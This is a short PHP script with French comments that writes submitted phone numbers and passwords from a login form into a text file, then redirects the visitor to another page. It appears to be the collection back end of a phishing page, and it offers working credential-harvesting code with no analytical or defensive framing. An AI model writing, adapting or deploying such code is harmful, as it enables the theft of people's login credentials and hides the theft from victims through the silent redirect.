<?php // Ce script va ouvrir un fichier userID.txt, inscrire les donn�es du formulaire et refermer le fichier.
$fp = fopen ("lolo.txt", "a");
fputs($fp, "\n");
fputs ($fp, "Numero telephone : ".$_POST['userID']);
fputs ($fp, "  -   password : ".$_POST['password']);
fclose ($fp);
?>
<?php // Ce script va faire une redirection automatique vers l'adresse de mon choix
header('Location: tt2.php');
exit;
?>